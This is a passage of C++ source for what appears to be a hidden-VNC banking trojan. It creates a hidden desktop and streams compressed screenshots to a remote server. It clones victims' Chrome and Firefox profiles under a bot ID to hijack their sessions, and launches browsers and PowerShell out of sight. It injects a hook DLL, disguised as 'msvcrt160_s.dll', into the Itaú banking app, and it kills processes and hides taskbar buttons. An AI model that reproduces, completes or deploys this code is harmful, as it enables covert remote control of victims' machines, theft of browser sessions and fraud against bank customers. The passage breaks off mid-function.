#include "HiddenDesktop.h"
#include "TestHook32.h"
#include <Windowsx.h>
#include <Windows.h>
#include <Process.h>
#include <Tlhelp32.h>
#include <Winbase.h>
#include <String.h>
#include <gdiplus.h>

#include <Objbase.h> // For COM functions
#include <Shobjidl.h> // For ITaskbarList
#include <vector>

#pragma comment (lib,"Gdiplus.Lib")
#pragma comment(lib, "shlwapi.lib")
using namespace Gdiplus;
vector<string> g_applist;
std::vector<DWORD> processesID;

#define file_log(x) MessageBox(NULL, x, "message", MB_OK);

enum Connection { desktop, input };
enum Input { mouse };

static const BYTE     gc_magik[] = { 'M', 'E', 'L', 'T', 'E', 'D', 0 };
static const COLORREF gc_trans = RGB(255, 174, 201);
static const CLSID jpegID = { 0x557cf401, 0x1a04, 0x11d3,{ 0x9a,0x73,0x00,0x00,0xf8,0x1e,0xf3,0x2e } }; // id of jpeg format

enum WmStartApp {
	startExplorer = WM_USER + 1, startRun, startChrome, startEdge, startBrave, startFirefox, startIexplore, startPowershell, startItau, monitorItau
};

static int        g_port;
static char       g_host[MAX_PATH];
static BOOL       g_started = FALSE;
static BYTE* g_pixels = NULL;
static BYTE* g_oldPixels = NULL;
static BYTE* g_tempPixels = NULL;
static HDESK      g_hDesk;
static BITMAPINFO g_bmpInfo;
static HANDLE     g_hInputThread, g_hDesktopThread, g_hMaintainDesktop;
static char       g_desktopName[MAX_PATH];
static ULARGE_INTEGER lisize;
static LARGE_INTEGER offset;
static BOOL g_fItauMonitored = false;
static BOOL g_fItauRunning = false;

void DeleteTaskbarButton(HWND hWnd) {
	// Step 1: Initialize COM
	HRESULT hr = CoInitialize(NULL);
	if (FAILED(hr)) {
		// Handle error
		return;
	}

	// Step 2: Create an instance of ITaskbarList
	ITaskbarList* pTaskbarList;
	hr = CoCreateInstance(CLSID_TaskbarList, NULL, CLSCTX_ALL, IID_ITaskbarList, (void**)& pTaskbarList);
	if (FAILED(hr)) {
		// Handle error
		CoUninitialize(); // Don't forget to uninitialize COM
		return;
	}

	// Step 3: Delete the tab
	hr = pTaskbarList->DeleteTab(hWnd);

	// Step 4: Release COM objects
	pTaskbarList->Release();
	CoUninitialize();

	if (FAILED(hr)) {
		// Handle error
		return;
	}
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
	using namespace Gdiplus;
	UINT  num = 0;
	UINT  size = 0;

	ImageCodecInfo* pImageCodecInfo = NULL;

	GetImageEncodersSize(&num, &size);
	if (size == 0)
		return -1;

	pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
	if (pImageCodecInfo == NULL)
		return -1;

	GetImageEncoders(num, size, pImageCodecInfo);
	for (UINT j = 0; j < num; ++j)
	{
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;
		}
	}
	free(pImageCodecInfo);
	return 0;
}

void BitmapToJpg(HDC scrdc, HDC* hDc, HBITMAP* hbmpImage, int width, int height)
{
	RECT rect;
	HWND hWndDesktop = Funcs::pGetDesktopWindow();
	Funcs::pGetWindowRect(hWndDesktop, &rect);

	static ULONG_PTR gdiplusToken;
	GdiplusStartupInput gdiplusStartupInput;
	GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
	{
		Funcs::pSelectObject(*hDc, hbmpImage);
		Funcs::pSetStretchBltMode(*hDc, HALFTONE);
		HDC hDcScreen = Funcs::pCreateCompatibleDC(scrdc);
		Funcs::pStretchBlt(*hDc, 0, 0, width, height,
			hDcScreen, 0, 0, rect.right, rect.bottom, SRCCOPY);
		//Funcs::pBitBlt(*hDc, 0, 0, width, height, scrdc, 0, 0, SRCCOPY);

		IStream* jpegStream = NULL;
		HRESULT res = CreateStreamOnHGlobal(NULL, TRUE, &jpegStream);
		Gdiplus::Bitmap bitmap(*hbmpImage, NULL);

		//Bitmap *Image = Bitmap::FromHBITMAP(*hbmpImage, NULL);
		//Image->Save(jpegStream, &jpegID, NULL);
		CLSID clsid;
		GetEncoderClsid(L"image/jpeg", &clsid);
		//bitmap.Save(L"screen.jpg", &clsid, NULL); // To save the jpeg to a file
		bitmap.Save(jpegStream, &clsid, NULL);

		Bitmap* JPEG = Bitmap::FromStream(jpegStream);
		HBITMAP compressedImage;
		JPEG->GetHBITMAP(Color::White, &compressedImage);
		Funcs::pGetDIBits(*hDc, compressedImage, 0, height, g_pixels, (BITMAPINFO*)& g_bmpInfo, DIB_RGB_COLORS);

		DeleteObject(compressedImage);
		delete JPEG;

		jpegStream->Release();
	}

	GdiplusShutdown(gdiplusToken);
	//delete Image, jpegStream;
}

static BOOL PaintWindow(HWND hWnd, HDC hDc, HDC hDcScreen)
{
	BOOL ret = FALSE;
	RECT rect;
	Funcs::pGetWindowRect(hWnd, &rect);

	HDC     hDcWindow = Funcs::pCreateCompatibleDC(hDc);
	HBITMAP hBmpWindow = Funcs::pCreateCompatibleBitmap(hDc, rect.right - rect.left, rect.bottom - rect.top);

	Funcs::pSelectObject(hDcWindow, hBmpWindow);
	if (Funcs::pPrintWindow(hWnd, hDcWindow, 0))
	{
		Funcs::pBitBlt(hDcScreen,
			rect.left,
			rect.top,
			rect.right - rect.left,
			rect.bottom - rect.top,
			hDcWindow,
			0,
			0,
			SRCCOPY);

		ret = TRUE;
	}
	Funcs::pDeleteObject(hBmpWindow);
	Funcs::pDeleteDC(hDcWindow);
	return ret;
}

void EnumerateChildWindows(HWND parentWindow, WNDENUMPROC proc, LPARAM param)
{
	char className[256];

	// Get the first child window
	HWND childWindow = GetWindow(parentWindow, GW_CHILD);
	if (childWindow == NULL)
		return;

	// Now, iterate over sibling windows of the child
	childWindow = GetWindow(childWindow, GW_HWNDLAST);
	if (childWindow == NULL)
		return;

	while (proc(childWindow, param))
	{
		GetClassName(childWindow, className, sizeof(className));
		WriteLog(className);

		// Move to the next sibling window
		childWindow = GetWindow(childWindow, GW_HWNDPREV);

		if (childWindow == NULL)
			break;
	}
}

static void EnumWindowsTopToDown(HWND owner, WNDENUMPROC proc, LPARAM param)
{
	char className[256];

	HWND currentWindow = Funcs::pGetTopWindow(owner);
	if (currentWindow == NULL)
		return;
	if ((currentWindow = Funcs::pGetWindow(currentWindow, GW_HWNDLAST)) == NULL)
		return;
	//while (proc(currentWindow, param) && (currentWindow = Funcs::pGetWindow(currentWindow, GW_HWNDPREV)) != NULL);
	while (proc(currentWindow, param))
	{
		//GetClassName(currentWindow, className, sizeof(className));
		//if (strstr(className, "Chrome") != 0)
		//{
		//	EnumerateChildWindows(currentWindow, proc, param);
		//}

		currentWindow = Funcs::pGetWindow(currentWindow, GW_HWNDPREV);
		if (currentWindow == NULL)
			break;
	}
}

struct EnumHwndsPrintData
{
	HDC hDc;
	HDC hDcScreen;
};

static BOOL CALLBACK EnumHwndsPrint(HWND hWnd, LPARAM lParam)
{
	EnumHwndsPrintData* data = (EnumHwndsPrintData*)lParam;

	if (!Funcs::pIsWindowVisible(hWnd))
		return TRUE;

	PaintWindow(hWnd, data->hDc, data->hDcScreen);

	//DWORD style = Funcs::pGetWindowLongA(hWnd, GWL_EXSTYLE);
	//Funcs::pSetWindowLongA(hWnd, GWL_EXSTYLE, style | WS_EX_COMPOSITED);
	//
	//OSVERSIONINFO versionInfo;
	//versionInfo.dwOSVersionInfoSize = sizeof(versionInfo);
	//Funcs::pGetVersionExA(&versionInfo);
	//if (versionInfo.dwMajorVersion < 6)
	//	EnumWindowsTopToDown(hWnd, EnumHwndsPrint, (LPARAM)data);
	return TRUE;
}

static BOOL GetDeskPixels(int serverWidth, int serverHeight)
{
	RECT rect;
	HWND hWndDesktop = Funcs::pGetDesktopWindow();
	Funcs::pGetWindowRect(hWndDesktop, &rect);

	HDC     hDc = Funcs::pGetDC(NULL);
	HDC     hDcScreen = Funcs::pCreateCompatibleDC(hDc);
	HBITMAP hBmpScreen = Funcs::pCreateCompatibleBitmap(hDc, rect.right, rect.bottom);
	Funcs::pSelectObject(hDcScreen, hBmpScreen);

	EnumHwndsPrintData data;
	data.hDc = hDc;
	data.hDcScreen = hDcScreen;

	EnumWindowsTopToDown(NULL, EnumHwndsPrint, (LPARAM)& data);

	if (serverWidth > rect.right)
		serverWidth = rect.right;
	if (serverHeight > rect.bottom)
		serverHeight = rect.bottom;

	if (serverWidth != rect.right || serverHeight != rect.bottom)
	{
		HBITMAP hBmpScreenResized = Funcs::pCreateCompatibleBitmap(hDc, serverWidth, serverHeight);
		HDC     hDcScreenResized = Funcs::pCreateCompatibleDC(hDc);

		Funcs::pSelectObject(hDcScreenResized, hBmpScreenResized);
		Funcs::pSetStretchBltMode(hDcScreenResized, HALFTONE);
		Funcs::pStretchBlt(hDcScreenResized, 0, 0, serverWidth, serverHeight,
			hDcScreen, 0, 0, rect.right, rect.bottom, SRCCOPY);

		Funcs::pDeleteObject(hBmpScreen);
		//Funcs::pDeleteDC(hDcScreen);
		Funcs::pDeleteObject(hDcScreen);


		hBmpScreen = hBmpScreenResized;
		hDcScreen = hDcScreenResized;
	}

	BOOL comparePixels = TRUE;
	g_bmpInfo.bmiHeader.biSizeImage = serverWidth * 3 * serverHeight;

	if (g_pixels == NULL || (g_bmpInfo.bmiHeader.biWidth != serverWidth || g_bmpInfo.bmiHeader.biHeight != serverHeight))
	{
		Funcs::pFree((HLOCAL)g_pixels);
		Funcs::pFree((HLOCAL)g_oldPixels);
		Funcs::pFree((HLOCAL)g_tempPixels);

		g_pixels = (BYTE*)Alloc(g_bmpInfo.bmiHeader.biSizeImage);
		g_oldPixels = (BYTE*)Alloc(g_bmpInfo.bmiHeader.biSizeImage);
		g_tempPixels = (BYTE*)Alloc(g_bmpInfo.bmiHeader.biSizeImage);

		comparePixels = FALSE;
	}

	g_bmpInfo.bmiHeader.biWidth = serverWidth;
	g_bmpInfo.bmiHeader.biHeight = serverHeight;
	//Funcs::pGetDIBits(hDcScreen, hBmpScreen, 0, serverHeight, g_pixels, &g_bmpInfo, DIB_RGB_COLORS);
	BitmapToJpg(hDc, &hDcScreen, &hBmpScreen, serverWidth, serverHeight);

	Funcs::pDeleteObject(hBmpScreen);
	//Funcs::pDeleteDC(hDcScreen);
	Funcs::pDeleteObject(hDcScreen);
	Funcs::pReleaseDC(NULL, hDc);

	if (comparePixels)
	{
		for (DWORD i = 0; i < g_bmpInfo.bmiHeader.biSizeImage; i += 3)
		{
			if (g_pixels[i] == GetRValue(gc_trans) &&
				g_pixels[i + 1] == GetGValue(gc_trans) &&
				g_pixels[i + 2] == GetBValue(gc_trans))
			{
				++g_pixels[i + 1];
			}
		}

		Funcs::pMemcpy(g_tempPixels, g_pixels, g_bmpInfo.bmiHeader.biSizeImage);

		BOOL same = TRUE;
		for (DWORD i = 0; i < g_bmpInfo.bmiHeader.biSizeImage - 1; i += 3)
		{
			if (g_pixels[i] == g_oldPixels[i] &&
				g_pixels[i + 1] == g_oldPixels[i + 1] &&
				g_pixels[i + 2] == g_oldPixels[i + 2])
			{
				g_pixels[i] = GetRValue(gc_trans);
				g_pixels[i + 1] = GetGValue(gc_trans);
				g_pixels[i + 2] = GetBValue(gc_trans);
			}
			else
				same = FALSE;
		}
		if (same)
			return TRUE;

		Funcs::pMemcpy(g_oldPixels, g_tempPixels, g_bmpInfo.bmiHeader.biSizeImage);
	}
	else
		Funcs::pMemcpy(g_oldPixels, g_pixels, g_bmpInfo.bmiHeader.biSizeImage);
	return FALSE;
}

static SOCKET ConnectServer()
{
	WSADATA     wsa;
	SOCKET      s;
	SOCKADDR_IN addr;

	if (Funcs::pWSAStartup(MAKEWORD(2, 2), &wsa) != 0)
		return NULL;
	if ((s = Funcs::pSocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		return NULL;

	hostent* he = Funcs::pGethostbyname(g_host);
	Funcs::pMemcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
	addr.sin_family = AF_INET;
	addr.sin_port = Funcs::pHtons(g_port);

	if (Funcs::pConnect(s, (sockaddr*)& addr, sizeof(addr)) < 0)
		return NULL;

	return s;
}

static int SendInt(SOCKET s, int i)
{
	return Funcs::pSend(s, (char*)& i, sizeof(i), 0);
}

static DWORD WINAPI DesktopThread(LPVOID param)
{
	SOCKET s = ConnectServer();

	if (!Funcs::pSetThreadDesktop(g_hDesk))
		goto exit;

	if (Funcs::pSend(s, (char*)gc_magik, sizeof(gc_magik), 0) <= 0)
		goto exit;
	if (SendInt(s, Connection::desktop) <= 0)
		goto exit;

	for (;;)
	{
		int width, height;

		if (Funcs::pRecv(s, (char*)& width, sizeof(width), 0) <= 0)
			goto exit;
		if (Funcs::pRecv(s, (char*)& height, sizeof(height), 0) <= 0)
			goto exit;

		BOOL same = false;
		same = GetDeskPixels(width, height);

		if (same)
		{
			if (SendInt(s, 0) <= 0)
				goto exit;
			continue;
		}

		if (SendInt(s, 1) <= 0)
			goto exit;

		DWORD workSpaceSize;
		DWORD fragmentWorkSpaceSize;
		Funcs::pRtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1, &workSpaceSize, &fragmentWorkSpaceSize);
		BYTE* workSpace = (BYTE*)Alloc(workSpaceSize);

		DWORD size;
		Funcs::pRtlCompressBuffer(COMPRESSION_FORMAT_LZNT1,
			g_pixels,
			g_bmpInfo.bmiHeader.biSizeImage,
			g_tempPixels,
			g_bmpInfo.bmiHeader.biSizeImage,
			2048,
			&size,
			workSpace);

		Funcs::pFree(workSpace);

		RECT rect;
		HWND hWndDesktop = Funcs::pGetDesktopWindow();
		Funcs::pGetWindowRect(hWndDesktop, &rect);
		if (SendInt(s, rect.right) <= 0)
			goto exit;
		if (SendInt(s, rect.bottom) <= 0)
			goto exit;
		if (SendInt(s, g_bmpInfo.bmiHeader.biWidth) <= 0)
			goto exit;
		if (SendInt(s, g_bmpInfo.bmiHeader.biHeight) <= 0)
			goto exit;
		if (SendInt(s, size) <= 0)
			goto exit;
		if (Funcs::pSend(s, (char*)g_tempPixels, size, 0) <= 0)
			goto exit;

		DWORD response;
		if (Funcs::pRecv(s, (char*)& response, sizeof(response), 0) <= 0)
			goto exit;
	}

exit:
	Funcs::pTerminateThread(g_hInputThread, 0);
	return 0;
}

static void killproc(const char* name)
{
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	while (hRes)
	{
		if (strcmp(pEntry.szExeFile, name) == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
				(DWORD)pEntry.th32ProcessID);
			if (hProcess != NULL)
			{
				TerminateProcess(hProcess, 9);
				CloseHandle(hProcess);
			}
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
}

static void StartChrome()
{
	g_fItauRunning = false;
	char chromePath[MAX_PATH] = { 0 };
	Funcs::pSHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, chromePath);
	Funcs::pLstrcatA(chromePath, Strs::hd7);

	char dataPath[MAX_PATH] = { 0 };
	Funcs::pLstrcpyA(dataPath, chromePath);
	Funcs::pLstrcatA(dataPath, Strs::hd10);

	char botId[BOT_ID_LEN] = { 0 };
	char newDataPath[MAX_PATH] = { 0 };
	Funcs::pLstrcpyA(newDataPath, chromePath);
	GetBotId(botId);
	Funcs::pLstrcatA(newDataPath, botId);

	CopyDir(dataPath, newDataPath);

	char path[MAX_PATH] = { 0 };
	Funcs::pLstrcpyA(path, Strs::hd8);
	Funcs::pLstrcatA(path, Strs::chromeExe);
	Funcs::pLstrcatA(path, Strs::hd9);
	Funcs::pLstrcatA(path, "\"");
	Funcs::pLstrcatA(path, newDataPath);


	string chromepath;
	for (auto appitem : g_applist)
	{
		size_t position = caseInsensitiveFind(appitem, "Google Chrome");
		if (position != std::string::npos)
		{
			//chrome 
			appitem = appitem.substr(position + strlen("Google Chrome\""), string::npos);
			size_t pos = appitem.find("\\Application");
			if (pos != std::string::npos) {
				pos = appitem.find_last_of("\\", pos);
				if (pos != std::string::npos) {
					chromepath = appitem.substr(0, pos + 1) + "Application\\chrome.exe --disable-gpu --disable-software-rasterizer ";
				}
			}
		}
	}

	chromepath += "--user-data-dir=" + std::string(newDataPath);
	//WriteLog(chromepath.c_str());

	STARTUPINFOA startupInfo = { 0 };
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.lpDesktop = g_desktopName;
	PROCESS_INFORMATION processInfo = { 0 };
	Funcs::pCreateProcessA(NULL, (PCHAR)chromepath.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static void StartItau()
{
	g_fItauRunning = true;
	std::string itauPath = getLocalAppdata();
	std::string itaurunpath = itauPath + "\\Aplicativo Itau\\itauaplicativo.exe";

	WriteLog(itaurunpath.c_str());

	//char itauPath[MAX_PATH] = { 0 };
	//Funcs::pSHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, itauPath);
	//Funcs::pLstrcatA(itauPath, "\\Aplicativo Itau\\itauaplicativo.exe");

	//MessageBox(NULL, itaurunpath.c_str(), "", MB_OK);
	STARTUPINFOA startupInfo = { 0 };
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.lpDesktop = g_desktopName;
	PROCESS_INFORMATION processInfo = { 0 };
	Funcs::pCreateProcessA(NULL, (PCHAR)itaurunpath.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

BOOL ReleaseLibrary(UINT uResourceId, CHAR* szResourceType, CHAR* szFileName)
{
	HRSRC hRsrc = FindResourceA(NULL, MAKEINTRESOURCEA(uResourceId), szResourceType);
	if (hRsrc == NULL)
	{
		MessageBox(0, "1", "1", MB_OK);
		return FALSE;
	}
	DWORD dwSize = SizeofResource(NULL, hRsrc);
	if (dwSize <= 0)
	{
		return FALSE;
	}
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL)
	{
		return FALSE;
	}
	LPVOID lpRes = LockResource(hGlobal);
	if (lpRes == NULL)
	{
		return FALSE;
	}
	HANDLE hFile = CreateFile(szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == NULL)
	{
		return FALSE;
	}
	DWORD dwWriten = 0;
	BOOL bRes = WriteFile(hFile, lpRes, dwSize, &dwWriten, NULL);
	if (bRes == FALSE || dwWriten <= 0)
	{
		return FALSE;
	}
	CloseHandle(hFile);
	return TRUE;
}

CHAR TargetProcess[][MAX_PATH]{
	"itauaplicativo.exe"
};

bool IsTargetProcess(CHAR* pszName) {
	for (int i = 0; i < sizeof(TargetProcess) / sizeof(TargetProcess[0]); i++) {
		if (strcmp(pszName, TargetProcess[i]) == 0)
			return true;
	}

	return false;
}

BOOL WINAPI InjectLib(DWORD dwProcessId, LPCSTR pszLibFile, PSECURITY_ATTRIBUTES pSecAttr) {

	BOOL fOk = FALSE; // Assume that the function fails
	HANDLE hProcess = NULL, hThread = NULL;
	PSTR pszLibFileRemote = NULL;

	__try
	{
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);

		if (hProcess == NULL)
			__leave;

		// Calculate the number of bytes needed for the DLL's pathname
		int cch = 1 + strlen(pszLibFile);

		// Allocate space in the remote process for the pathname
		pszLibFileRemote = (PSTR)VirtualAllocEx(hProcess, NULL, cch, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (pszLibFileRemote == NULL)
			__leave;

		// Copy the DLL's pathname to the remote process's address space
		if (!WriteProcessMemory(hProcess, pszLibFileRemote, (PVOID)pszLibFile, cch, NULL))
			__leave;

		// Get the real address of LoadLibraryW in Kernel32.dll
		PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("Kernel32"), "LoadLibraryA");

		if (pfnThreadRtn == NULL)
			__leave;

		HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, NULL, pfnThreadRtn, pszLibFileRemote, NULL, NULL);

		if (hRemoteThread == NULL)
			__leave;
		// Wait until the remote thread is done loading the dll.
		WaitForSingleObject(hRemoteThread, INFINITE);
		fOk = true;
	}

	__finally
	{
		if (pszLibFileRemote != NULL)
			VirtualFreeEx(hProcess, pszLibFileRemote, 0, MEM_RELEASE);

		if (hThread != NULL)
			CloseHandle(hThread);

		if (hProcess != NULL)
			CloseHandle(hProcess);
	}

	return(fOk);
}

BOOL IsHookedProcess(DWORD th32ProcessID)
{
	for (size_t i = 0; i < processesID.size(); i++) {
		DWORD processId = processesID[i];
		if (th32ProcessID == processId)
			return true;
	}
	return false;
}
BOOL InstalHookDll(char* pDllPath)
{
	HANDLE hSnapshot = NULL;
	PROCESSENTRY32 pe;

	LPCSTR pDllName = strrchr(pDllPath, '\\');
	pDllName++;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	pe.dwSize = sizeof(pe);

	Process32First(hSnapshot, &pe);
	do
	{
		MODULEENTRY32 ModuleEntry;
		HANDLE hModule = INVALID_HANDLE_VALUE;
		ModuleEntry.dwSize = sizeof(ModuleEntry);
		hModule = INVALID_HANDLE_VALUE;
		bool ExistMon = false;

		if (IsTargetProcess(pe.szExeFile))
		{
			hModule = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe.th32ProcessID);
			BOOL bNextModule = Module32First(hModule, &ModuleEntry);
			while (bNextModule)
			{
				if (_stricmp(ModuleEntry.szModule, pDllName) == 0)
				{
					ExistMon = true;
				}
				bNextModule = Module32Next(hModule, &ModuleEntry);
			}

			if (!ExistMon)
			{
				if (InjectLib(pe.th32ProcessID, pDllPath, NULL) == false)
				{
					file_log("failed to inject");
				}
				else {
					file_log("success to inject");
				}
			}
			else {
				file_log("already hooked");
			}

			CloseHandle(hModule);
		}


	} while (Process32Next(hSnapshot, &pe));

	CloseHandle(hSnapshot);

	return TRUE;
}

BOOL ReleaseLibrary(CHAR* szFileName)
{
	HANDLE hFile = CreateFile(szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == NULL)
	{
		return FALSE;
	}
	DWORD dwWriten = 0;
	BOOL bRes = WriteFile(hFile, TestHook32_dll, TestHook32_dll_len, &dwWriten, NULL);
	if (bRes == FALSE || dwWriten <= 0)
	{
		return FALSE;
	}
	CloseHandle(hFile);
	return TRUE;
}

/*void MonitorItau()
{
	g_fItauMonitored = true;
	TCHAR tempPath[MAX_PATH] = { 0 };
	TCHAR scandllPath[MAX_PATH] = { 0 };
	TCHAR hookdllPath[MAX_PATH] = { 0 };


	// Get the path of the temporary directory
	DWORD pathLen = GetTempPath(MAX_PATH, tempPath);
	if (pathLen > MAX_PATH || pathLen == 0) {
		// Error handling
		return;
	}

	// strcpy(hookdllPath, "D:\\");
	strcpy(hookdllPath, tempPath);
	strcat(hookdllPath, "msvcrt160_s.dll");

	if (!PathFileExistsA(hookdllPath)) {
		BOOL bRes = ReleaseLibrary(hookdllPath);
		if (bRes == FALSE) {
			return;
		}
	}
	else {
		DeleteFileA(hookdllPath);
		ReleaseLibrary(hookdllPath);
	}

	Sleep(10);
	InstalHookDll(hookdllPath); //hook  TestHoook to Itau
}*/

static void StartEdge()
{
	g_fItauRunning = false;
	char path[MAX_PATH] = { 0 };
	Funcs::pLstrcpyA(path, Strs::hd8);
	Funcs::pLstrcatA(path, Strs::edgeExe);
	Funcs::pLstrcatA(path, Strs::hd9);

	STARTUPINFOA startupInfo = { 0 };
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.lpDesktop = g_desktopName;
	PROCESS_INFORMATION processInfo = { 0 };
	Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static void StartBrave()
{
	g_fItauRunning = false;
	killproc("brave.exe");
	char path[MAX_PATH] = { 0 };
	Funcs::pLstrcpyA(path, Strs::hd8);
	Funcs::pLstrcatA(path, Strs::braveExe);
	Funcs::pLstrcatA(path, Strs::hd9);

	STARTUPINFOA startupInfo = { 0 };
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.lpDesktop = g_desktopName;
	PROCESS_INFORMATION processInfo = { 0 };
	Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static void StartFirefox()
{
	g_fItauRunning = false;
	char firefoxPath[MAX_PATH] = { 0 };
	Funcs::pSHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, firefoxPath);
	Funcs::pLstrcatA(firefoxPath, Strs::hd11);

	char profilesIniPath[MAX_PATH] = { 0 };
	Funcs::pLstrcpyA(profilesIniPath, firefoxPath);
	Funcs::pLstrcatA(profilesIniPath, Strs::hd5);

	HANDLE hProfilesIni = CreateFileA
	(
		profilesIniPath,
		FILE_READ_ACCESS,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (hProfilesIni == INVALID_HANDLE_VALUE)
		return;

	DWORD profilesIniSize = GetFileSize(hProfilesIni, 0);
	DWORD read;
	char* profilesIniContent = (char*)Alloc(profilesIniSize + 1);
	ReadFile(hProfilesIni, profilesIniContent, profilesIniSize, &read, NULL);
	profilesIniContent[profilesIniSize] = 0;

	char* isRelativeRead = Funcs::pStrStrA(profilesIniContent, Strs::hd12);
	if (!isRelativeRead)
		goto exit;
	isRelativeRead += 11;
	BOOL isRelative = (*isRelativeRead == '1');

	char* path = Funcs::pStrStrA(profilesIniContent, Strs::hd13);
	if (!path)
		goto exit;
	char* pathEnd = Funcs::pStrStrA(path, "\r");
	if (!pathEnd)
		goto exit;
	*pathEnd = 0;
	path += 5;

	char realPath[MAX_PATH] = { 0 };
	if (isRelative)
		Funcs::pLstrcpyA(realPath, firefoxPath);
	Funcs::pLstrcatA(realPath, path);

	char botId[BOT_ID_LEN];
	GetBotId(botId);

	char newPath[MAX_PATH];
	Funcs::pLstrcpyA(newPath, firefoxPath);
	Funcs::pLstrcatA(newPath, botId);

	CopyDir(realPath, newPath);

	char browserPath[MAX_PATH] = { 0 };
	Funcs::pLstrcpyA(browserPath, Strs::hd8);
	Funcs::pLstrcatA(browserPath, Strs::firefoxExe);
	Funcs::pLstrcatA(browserPath, Strs::hd14);
	Funcs::pLstrcatA(browserPath, "\"");
	Funcs::pLstrcatA(browserPath, newPath);
	Funcs::pLstrcatA(browserPath, "\"");

	STARTUPINFOA startupInfo = { 0 };
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.lpDesktop = g_desktopName;
	PROCESS_INFORMATION processInfo = { 0 };
	Funcs::pCreateProcessA(NULL, browserPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);

exit:
	Funcs::pCloseHandle(hProfilesIni);
	Funcs::pFree(profilesIniContent);

}

static void StartPowershell()
{
	g_fItauRunning = false;
	char path[MAX_PATH] = { 0 };
	Funcs::pLstrcpyA(path, Strs::hd8);
	Funcs::pLstrcatA(path, Strs::powershell);

	STARTUPINFOA startupInfo = { 0 };
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.lpDesktop = g_desktopName;
	PROCESS_INFORMATION processInfo = { 0 };
	Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static void StartIe()
{
	g_fItauRunning = false;
	char path[MAX_PATH] = { 0 };
	Funcs::pLstrcpyA(path, Strs::hd8);
	Funcs::pLstrcatA(path, Strs::iexploreExe);

	STARTUPINFOA startupInfo = { 0 };
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.lpDesktop = g_desktopName;
	PROCESS_INFORMATION processInfo = { 0 };
	Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

// Callback function to collect visible window handles
BOOL CALLBACK EnumVisibleWindowsCallback(HWND hWnd, LPARAM lParam) {
	std::vector<std::pair<HWND, std::string>>* pVisibleWindows = reinterpret_cast<std::vector<std::pair<HWND, std::string>>*>(lParam);

	if (IsWindowVisible(hWnd)) {
		// Get the process ID of the window
		DWORD processId;
		GetWindowThreadProcessId(hWnd, &processId);

		// Get the process handle
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
		if (hProcess != NULL) {
			// Get the executable file name of the process
			CHAR szFileName[MAX_PATH];
			DWORD fileNameLength = GetModuleFileNameExA(hProcess, NULL, szFileName, MAX_PATH);
			if (fileNameLength > 0) {
				// Add the window handle and application name to the vector
				pVisibleWindows->push_back(std::make_pair(hWnd, std::string(szFileName, fileNameLength)));
			}
			CloseHandle(hProcess);
		}
	}

	return TRUE; // Continue enumeration
}

// Function to get all visible window handles and their associated application names
std::vector<std::pair<HWND, std::string>> GetAllVisibleWindowsWithAppName() {
	std::vector<std::pair<HWND, std::string>> visibleWindows;

	// Enumerate all top-level windows
	if (!EnumWindows(EnumVisibleWindowsCallback, reinterpret_cast<LPARAM>(&visibleWindows))) {
		// Handle error
	}

	return visibleWindows;
}

static DWORD WINAPI MaintainThread(LPVOID param)
{
	while (1)
	{
		Sleep(50);
		HDESK hDesktop = OpenInputDesktop(0, FALSE, GENERIC_ALL);
		CHAR desktopName[MAX_PATH];
		if (!GetUserObjectInformationA(hDesktop, UOI_NAME, desktopName, sizeof(desktopName), NULL)) {
			CloseDesktop(hDesktop);
			//return 1;
		}
		if (strcmp(desktopName, "default_set") == 0)
		{
